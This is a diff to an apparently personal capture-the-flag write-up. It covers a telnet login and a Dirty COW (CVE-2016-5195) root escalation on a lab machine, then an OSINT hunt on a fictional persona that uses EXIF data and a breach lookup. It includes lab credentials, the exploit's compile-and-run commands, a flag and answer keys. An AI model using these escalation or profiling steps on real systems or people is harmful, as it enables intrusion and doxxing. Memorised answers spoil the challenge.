@@ -429,7 +429,7 @@ target_ip : 10.10.206.228
 
 ----
 
-#﻿ Day 12: Ready, set, elf.[CGI, Metasploit]
+## Day 12: Ready, set, elf.[CGI, Metasploit]
 
 target: 10.10.36.221
 
@@ -551,14 +551,155 @@ learn Metaspolit
 
 ----
 
-## Day 13 - Coal for Christmas 
+## Day 13 - Coal for Christmas[SPECIAL, telnet, Enumeration, dirtyCow, md5]
 
+target : 10.10.242.55
+
+**Action 0** : `nmap <target>` revealed open ports ;
+```
+PORT    STATE SERVICE
+22/tcp  open  ssh
+23/tcp  open  telnet
+111/tcp open  rpcbind  
+```
+
+**Action 1** : `telnet 10.10.242.55 23` prompted with
+
+- username-santa  and 
+- password-clauschristmas 
+
+and it worked LOL.
+
+
+**Action 2** : found 2 files inside `/home/santa` : `hristmas.sh`, `cookies_and_milk.txt` 
+
+**Action 3** : 
+- `cat /etc/*release` revealed it is running `Ubuntu 12.04 LTS`
+
+- `uname -a` revealed the kernel `3.2.0-23-generic` supports both x86 and x64
+
+- `cat /etc/issue` left a note with username `santa` and its password and it added "We left you cookies and milk!"
+
+**Action 4** :
+
+- `cat cookies_and_milk.txt`
+- `cat christmas.sh`
+
+**Action 5** : found [dirty.c](https://raw.githubusercontent.com/FireFart/dirtycow/master/dirty.c) exploiting `dirtyc0w`(CVE-2016-5195)
+
+**Action 6** : compiles dirty cow(copy-on-write) with `cc -pthread dirty.c -o dirty -lcrypt` and ran it with `./dirty` 
+it created a new account with username `firefart` with root priviledges
+
+**Action 7** : logged in to `firefart` with `su firefart` 
+
+**Action 8** : followed the instruction given in `\root\message_from_the_grinch.txt`
+
+### Challenges Ans
+
+0. **Qus:** What old, deprecated protocol and service is running?
+
+   **Ans:** `Telnet`
+
+0. **Qus:** What credential was left for you?
+
+   **Ans:**  Writeups should have a link to TryHackMe and not include any [passwords](`clauschristmas`)/cracked hashes/flags
+
+0. **Qus:** What distribution of Linux and version number is this server running?
+
+   **Ans:** `Ubuntu 12.04`
+
+0. **Qus:** Who got here first?
+
+   **Ans:** `Grinch`
+
+0. **Qus:** What is the verbatim syntax you can use to compile, taken from the real C source code comments?
+
+   **Ans:** `gcc -pthread dirty.c -o dirty -lcrypt`
+
+0. **Qus:** What "new" username was created, with the default operations of the real C source code?
+
+   **Ans:** `firefart`
+
+0. **Qus:** What is the MD5 hash output?
+
+   **Ans:**  Writeups should have a link to TryHackMe and not include any passwords/[cracked hashes](8b16f00dd3b51efadb02c1df7f8427cc)/flags
+
+----
+
+## Day 14: Where's Rudolph?[OSINT]
+
+### Objectives of the day :
+- user : Rudolph
+- site : Reddit
+- username : IGuidetheClaus2020
+
+
+1) Identify important information based on a user's posting history.
+2) Utilize outside resources, such as search engines, to identify additional information, such as full names and additional social media accounts.
+
+**Action 0** Found Rudlof on Reddit searching by his user name in `https://whatsmyname.app/`
+
+- Found he's born in `chicago` and he mentioned his creator is `robert`
+- And found he has a `twitter` account
+
+**Action 1** going twitter and searching with the same username I got only one account `https://twitter.com/IGuideClaus2020`. Went throught bunch of tweets to get info about `Rudlof`
+
+- found lots of tweets of `bacheloratte`
+- reverse image searching from a tweet got adderss
+- got a lot of info(EXIF) out of a direct image link using `http://exif.regex.info`
+- foung email address and searched(`email:rudolphthered@hotmail.com`) for it in `https://scylla.sh/api` for breaches and found one breach whic exposed the password
+
+**Action 2** by searching with the coordinates of the image in google maps, found a mariot hotel really close to it, the address was:
+`540 N Michigan Ave, Chicago, IL 60611, United States`
+
+**Action 3** the reverse image srch also gave me a string `rudolph the red nosed reindeer` searching by it I got to know the creator of Rudlof `Robert L. May`
+
+### Challenge Ans
+
+1.  **Qus:**  What URL will take me directly to Rudolph's Reddit comment history?
+ 
+    **Ans:** `https://www.reddit.com/user/IGuidetheClaus2020/comments/`
+ 
+2.  **Qus:** According to Rudolph, where was he born?
+
+    **Ans:** `Chicago`
+
+3.  **Qus:** Rudolph mentions Robert.  Can you use Google to tell me Robert's last name?
+    
+    **Ans:** `May`
+
+4.  **Qus:** On what other social media platform might Rudolph have an account?
+    **Ans:** `Twitter`
+
+5.  **Qus:** What is Rudolph's username on that platform?
+    
+    **Ans:** `IGuideClaus2020`
+
+6.  **Qus:** What appears to be Rudolph's favorite TV show right now?
+
+    **Ans:** `bachelorette`
+
+7.  **Qus:** Based on Rudolph's post history, he took part in a parade.  Where did the parade take place?
+  
+    **Ans:** `chicago`
+
+8.  **Qus:** Okay, you found the city, but where specifically was one of the photos taken?
+
+    **Ans:** 41.891815, -87.624277
+
+9.  **Qus:** Did you find a flag too?
+
+    **Ans:** {FLAG}ALWAYSCHECKTHEEXIFD4T4
+
+10. **Qus:** Has Rudolph been pwned? What password of his appeared in a breach?
+
+    **Ans:** `spygame`
+
+11. **Qus:** Based on all the information gathered.  It's likely that Rudolph is in the Windy City and is staying in a hotel on Magnificent Mile.  What are the street numbers of the hotel address?
+
+    **Ans:** `540`
 
 ---
-
-
-## Day 14 - OSIT
-
 
 ## Day 15 - Python
 
